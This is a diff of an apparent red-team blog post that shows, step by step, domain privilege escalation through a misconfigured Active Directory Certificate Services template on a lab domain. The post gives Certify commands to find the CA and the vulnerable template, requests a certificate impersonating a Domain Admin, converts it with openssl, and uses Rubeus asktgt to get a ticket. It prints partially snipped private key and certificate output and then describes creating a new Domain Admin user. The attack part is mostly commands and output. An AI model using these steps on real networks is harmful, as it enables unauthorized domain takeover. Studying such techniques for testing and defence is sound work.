@@ -14,8 +14,16 @@
 <meta property="og:description" content="Privilege Escalation by using Vulnerable Certificate TemplateActive Directory Certificate Services (AD CS) is one of the server roles  provides users with customizable services for creating and managi">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://erberkan.github.io/2022/ca-misconfigure-template/ca-1.png">
+<meta property="og:image" content="https://erberkan.github.io/2022/ca-misconfigure-template/ca-3.png">
+<meta property="og:image" content="https://erberkan.github.io/2022/ca-misconfigure-template/ca-4.png">
+<meta property="og:image" content="https://erberkan.github.io/2022/ca-misconfigure-template/ca-5.png">
+<meta property="og:image" content="https://erberkan.github.io/2022/ca-misconfigure-template/ca-6.png">
+<meta property="og:image" content="https://erberkan.github.io/2022/ca-misconfigure-template/ca-7.png">
+<meta property="og:image" content="https://erberkan.github.io/2022/ca-misconfigure-template/ca-9.png">
+<meta property="og:image" content="https://erberkan.github.io/2022/ca-misconfigure-template/ca-10.png">
+<meta property="og:image" content="https://erberkan.github.io/2022/ca-misconfigure-template/ca-0.png">
 <meta property="article:published_time" content="2022-04-22T20:55:27.000Z">
-<meta property="article:modified_time" content="2022-04-22T20:35:54.567Z">
+<meta property="article:modified_time" content="2022-04-22T20:38:43.005Z">
 <meta property="article:author" content="B3R">
 <meta property="article:tag" content="redteamops">
 <meta name="twitter:card" content="summary">
@@ -111,7 +119,7 @@
 
     </div>
     <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation-by-using-Vulnerable-Certificate-Template"><span class="toc-number">1.</span> <span class="toc-text">Privilege Escalation by using Vulnerable Certificate Template</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation-by-using-Vulnerable-Certificate-Template"><span class="toc-number">1.</span> <span class="toc-text">Privilege Escalation by using Vulnerable Certificate Template</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#I-am-not-in-Authority-I-AM-THE-AUTHORITY"><span class="toc-number">2.</span> <span class="toc-text">I am not in Authority, I AM THE AUTHORITY !</span></a></li></ol>
     </div>
   </span>
 </div>
@@ -161,41 +169,43 @@
 <p><img src="/2022/ca-misconfigure-template/ca-1.png"></p>
 <p>We can enumerate the servers which is installed Certificate Services by using <a target="_blank" rel="noopener" href="https://github.com/GhostPack/Certify">Certify</a> tool like below;</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Certifiy.exe cas</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><figcaption><span>host looks a certificate authority.</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![](ca-misconfigure-template&#x2F;ca-3.png)</span><br><span class="line"></span><br><span class="line">Let&#39;s check that It has any vulnerable template;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>Certify.exe find /vulnerable</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">![](ca-misconfigure-template&#x2F;ca-4.png)</span><br><span class="line"></span><br><span class="line">Perfect ! There is a vulnerable certificate template which name is &#96;&#96;TEST-WEBSERVER&#96;&#96;.</span><br><span class="line"></span><br><span class="line">* **ENROLLEE_SUPPLIES_SUBJECT** means that any user who is allowed to enroll in a certificate with this setting can request a certificate as any user in the network, including a privileged user.</span><br><span class="line">* pkiextendedkeyusage and mspki-certificate-application-policy has **Client Authentication**</span><br><span class="line">* Enrollment Rights has **NT AUTHORITY\Users** group. It means any authenticated users can issued a certificate.</span><br><span class="line"></span><br><span class="line">We can request a certificate for a Domain Admins user.</span><br><span class="line"></span><br><span class="line">First of all, let&#39;s generate the certificate for &#96;&#96;zeus&#96;&#96;.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>Certify.exe request /ca:ACMEDC.acme.local\acme-ACMEDC-CA-1 /template:TEST-WEBSERVER /altuser:zeus</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">![](ca-misconfigure-template&#x2F;ca-5.png)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>[*] cert.pem         :</p>
-<p>—–BEGIN RSA PRIVATE KEY—–<br>MIIEpAIBAAKCAQEAwLz/aZzHeWsZ4ZXJBL0goMzTkEMeybtreQ6CKEgsh9zYKIh+<br>6nhkaENI97npE40ZDmnQdFCAFH27XiTpONX/hHDUf4335MAgCYStv0QgjTq0udot<br>wkJfU3YxB7KKPCRfnvXCsHW/tb1FO1rmgaCFt3dg0PZIFyS1ylG3t8muG6iaSdsX<br>rugEgC+6T8XT9Skm0Rwf1iGQ0P5c66SUHh999Nef87I0aISU+qrkXXPd4VEK5Cfr<br>JrSCu/GM3RbqzHqi9W6oOmWmK+vjiKLuYto3MWSsCc6SESeg7351Wx0N+qpLcSMt</p>
-<p>–snip–</p>
-<p>/gKBv/QLJi0dcJYyC70Yuh0CgYEAxuvPYIAx8nMSHXmdZ+7+jq8B0YAH2q01TXGD<br>Ib3YMbquRUFm3+YzAyNpwBRnLZqzD+Sla8y5tgG++fF5vxg8MiUqzNMSQJL9OdrM<br>jnq6ypnzZn3nlyBb9uVJz+E0qiHNpGSPdECH18sQOFyfGorYiAAdo+9xlz02Xg/0<br>EbqTToMCgYAkCP0WI9IDOvNb1A/xfSKnQA2qgNnfQ9m0r85Y3QxGVw87FVmzNzKz<br>/1pp0NF6fdVADgu5AGVIh1jrwONdqX8DM1EAbAkx/kvYws4oCWhXhJhmuDdvunGF<br>tpWVa6ZG/tbW3wEZUEImjMpnOig9u6RpGqBxLyk02vSVSE5q3a1pVw==<br>—–END RSA PRIVATE KEY—–<br>—–BEGIN CERTIFICATE—–<br>MIIFszCCBJugAwIBAgITFwAAAAQF7JReZ47L9gAAAAAABDANBgkqhkiG9w0BAQsF<br>ADBIMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxFDASBgoJkiaJk/IsZAEZFgRhY21l<br>MRkwFwYDVQQDExBhY21lLUFDTUVEQy1DQS0xMB4XDTIyMDQyMjE4MDYzMFoXDTI0<br>MDQyMTE4MDYzMFowTjEVMBMGCgmSJomT8ixkARkWBWxvY2FsMRQwEgYKCZImiZPy</p>
-<p>–snip–</p>
-<p>A/s/8+EokhOJM3R3aeTTWN2heLsTzOAbuCXHequnxVXL52A7DEHF9IwaA4T2dBYI<br>mEkkrE5FxQa6delTiGxFHvMf5lXQXFW3Xl1t/Z8+lLVvikGwlhsVtmrKrA+yFsTr<br>5Al860sNjSfQqX49dtVBn68oV7+6W/t/+0EK58A+NKVBIxwhujmlGWwT02w8GVpj<br>UZ1odMPP7MutSPMUt9H0nQl8j0RknX4=<br>—–END CERTIFICATE—–</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Save the certificate as &#96;&#96;cert.pem&#96;&#96; and then convert to pfx format by using openssl command.</span><br><span class="line"></span><br><span class="line">![](ca-misconfigure-template&#x2F;ca-6.png)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>openssl pkcs12 -in cert.pem -keyex -CSP “Microsoft Enhanced Cryptographic Provider v1.0” -export put cert.pfx</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Then encode cert.pfx with base64 for using on Ticket Granting Ticket (TGT) request.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>cat cert.pfx | base64 -w 0</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">![](ca-misconfigure-template&#x2F;ca-7.png)</span><br><span class="line"></span><br><span class="line">And final step is request a TGT by using this certificate that encoded with base64 and then import the ticket.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>C:\bin\Rubeus.exe asktgt /user:zeus /certificate:MIIMbwIBAzCCDDUGCSqGByPcK/zZw0OjCIln5Fz3 –snip– +KvcECJ04lN89sU7mAgIIAA== /password:password</p>
-<pre><code>![](/2022/ca-misconfigure-template/ca-9.png)
+<p><code>ACMEDC.ACME.LOCAL</code> host looks a certificate authority. </p>
+<p><img src="/2022/ca-misconfigure-template/ca-3.png"></p>
+<p>Let’s check that It has any vulnerable template;</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Certify.exe find &#x2F;vulnerable</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/ca-misconfigure-template/ca-4.png"></p>
+<p>Perfect ! There is a vulnerable certificate template which name is <code>TEST-WEBSERVER</code>.</p>
+<ul>
+<li><strong>ENROLLEE_SUPPLIES_SUBJECT</strong> means that any user who is allowed to enroll in a certificate with this setting can request a certificate as any user in the network, including a privileged user.</li>
+<li>pkiextendedkeyusage and mspki-certificate-application-policy has <strong>Client Authentication</strong></li>
+<li>Enrollment Rights has <strong>NT AUTHORITY\Users</strong> group. It means any authenticated users can issued a certificate.</li>
+</ul>
+<p>We can request a certificate for a Domain Admins user.</p>
+<p>First of all, let’s generate the certificate for <code>zeus</code>.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Certify.exe request &#x2F;ca:ACMEDC.acme.local\acme-ACMEDC-CA-1 &#x2F;template:TEST-WEBSERVER &#x2F;altuser:zeus</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/ca-misconfigure-template/ca-5.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">[*] cert.pem         :</span><br><span class="line"> </span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEpAIBAAKCAQEAwLz&#x2F;aZzHeWsZ4ZXJBL0goMzTkEMeybtreQ6CKEgsh9zYKIh+</span><br><span class="line">6nhkaENI97npE40ZDmnQdFCAFH27XiTpONX&#x2F;hHDUf4335MAgCYStv0QgjTq0udot</span><br><span class="line">wkJfU3YxB7KKPCRfnvXCsHW&#x2F;tb1FO1rmgaCFt3dg0PZIFyS1ylG3t8muG6iaSdsX</span><br><span class="line">rugEgC+6T8XT9Skm0Rwf1iGQ0P5c66SUHh999Nef87I0aISU+qrkXXPd4VEK5Cfr</span><br><span class="line">JrSCu&#x2F;GM3RbqzHqi9W6oOmWmK+vjiKLuYto3MWSsCc6SESeg7351Wx0N+qpLcSMt</span><br><span class="line"></span><br><span class="line">--snip--</span><br><span class="line"></span><br><span class="line">&#x2F;gKBv&#x2F;QLJi0dcJYyC70Yuh0CgYEAxuvPYIAx8nMSHXmdZ+7+jq8B0YAH2q01TXGD</span><br><span class="line">Ib3YMbquRUFm3+YzAyNpwBRnLZqzD+Sla8y5tgG++fF5vxg8MiUqzNMSQJL9OdrM</span><br><span class="line">jnq6ypnzZn3nlyBb9uVJz+E0qiHNpGSPdECH18sQOFyfGorYiAAdo+9xlz02Xg&#x2F;0</span><br><span class="line">EbqTToMCgYAkCP0WI9IDOvNb1A&#x2F;xfSKnQA2qgNnfQ9m0r85Y3QxGVw87FVmzNzKz</span><br><span class="line">&#x2F;1pp0NF6fdVADgu5AGVIh1jrwONdqX8DM1EAbAkx&#x2F;kvYws4oCWhXhJhmuDdvunGF</span><br><span class="line">tpWVa6ZG&#x2F;tbW3wEZUEImjMpnOig9u6RpGqBxLyk02vSVSE5q3a1pVw&#x3D;&#x3D;</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br><span class="line">-----BEGIN CERTIFICATE-----</span><br><span class="line">MIIFszCCBJugAwIBAgITFwAAAAQF7JReZ47L9gAAAAAABDANBgkqhkiG9w0BAQsF</span><br><span class="line">ADBIMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxFDASBgoJkiaJk&#x2F;IsZAEZFgRhY21l</span><br><span class="line">MRkwFwYDVQQDExBhY21lLUFDTUVEQy1DQS0xMB4XDTIyMDQyMjE4MDYzMFoXDTI0</span><br><span class="line">MDQyMTE4MDYzMFowTjEVMBMGCgmSJomT8ixkARkWBWxvY2FsMRQwEgYKCZImiZPy</span><br><span class="line"></span><br><span class="line">--snip--</span><br><span class="line"></span><br><span class="line">A&#x2F;s&#x2F;8+EokhOJM3R3aeTTWN2heLsTzOAbuCXHequnxVXL52A7DEHF9IwaA4T2dBYI</span><br><span class="line">mEkkrE5FxQa6delTiGxFHvMf5lXQXFW3Xl1t&#x2F;Z8+lLVvikGwlhsVtmrKrA+yFsTr</span><br><span class="line">5Al860sNjSfQqX49dtVBn68oV7+6W&#x2F;t&#x2F;+0EK58A+NKVBIxwhujmlGWwT02w8GVpj</span><br><span class="line">UZ1odMPP7MutSPMUt9H0nQl8j0RknX4&#x3D;</span><br><span class="line">-----END CERTIFICATE-----</span><br></pre></td></tr></table></figure>
 
-Ta-da! We now have Domain Admin permissions. Let&#39;s access the Domain Controller&#39;s C$ and create a user and add it to the Domain Admins group member. 
+<p>Save the certificate as <code>cert.pem</code> and then convert to pfx format by using openssl command.</p>
+<p><img src="/2022/ca-misconfigure-template/ca-6.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl pkcs12 -in cert.pem -keyex -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export put cert.pfx</span><br></pre></td></tr></table></figure>
 
-![](/2022/ca-misconfigure-template/ca-10.png)
-
-
-## I am not in Authority, I AM THE AUTHORITY !
-
-![](/2022/ca-misconfigure-template/ca-0.png)
-
-Cheers !
-
-Reference:
-* [Certified Pre-Owned: Abusing Active Directory Certificate Services](https://youtu.be/ejmAIgxFRgM)
-* [Certify](https://github.com/GhostPack/Certify) 
-* [Rubeus](https://github.com/GhostPack/Rubeus)
-</code></pre>
+<p>Then encode cert.pfx with base64 for using on Ticket Granting Ticket (TGT) request.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat cert.pfx | base64 -w 0</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/ca-misconfigure-template/ca-7.png"></p>
+<p>And final step is request a TGT by using this certificate that encoded with base64 and then import the ticket.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\bin\Rubeus.exe asktgt &#x2F;user:zeus &#x2F;certificate:MIIMbwIBAzCCDDUGCSqGByPcK&#x2F;zZw0OjCIln5Fz3 --snip-- +KvcECJ04lN89sU7mAgIIAA&#x3D;&#x3D; &#x2F;password:password</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="/2022/ca-misconfigure-template/ca-9.png"></p>
+<p>Ta-da! We now have Domain Admin permissions. Let’s access the Domain Controller’s C$ and create a user and add it to the Domain Admins group member. </p>
+<p><img src="/2022/ca-misconfigure-template/ca-10.png"></p>
+<h2 id="I-am-not-in-Authority-I-AM-THE-AUTHORITY"><a href="#I-am-not-in-Authority-I-AM-THE-AUTHORITY" class="headerlink" title="I am not in Authority, I AM THE AUTHORITY !"></a>I am not in Authority, I AM THE AUTHORITY !</h2><p><img src="/2022/ca-misconfigure-template/ca-0.png"></p>
+<p>Cheers !</p>
+<p>Reference:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://youtu.be/ejmAIgxFRgM">Certified Pre-Owned: Abusing Active Directory Certificate Services</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/GhostPack/Certify">Certify</a> </li>
+<li><a target="_blank" rel="noopener" href="https://github.com/GhostPack/Rubeus">Rubeus</a></li>
+</ul>
 
   </div>
 </article>
@@ -219,7 +229,7 @@ Reference:
     </div>
 
     <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation-by-using-Vulnerable-Certificate-Template"><span class="toc-number">1.</span> <span class="toc-text">Privilege Escalation by using Vulnerable Certificate Template</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation-by-using-Vulnerable-Certificate-Template"><span class="toc-number">1.</span> <span class="toc-text">Privilege Escalation by using Vulnerable Certificate Template</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#I-am-not-in-Authority-I-AM-THE-AUTHORITY"><span class="toc-number">2.</span> <span class="toc-text">I am not in Authority, I AM THE AUTHORITY !</span></a></li></ol>
     </div>
 
     <div id="share-footer" style="display: none">
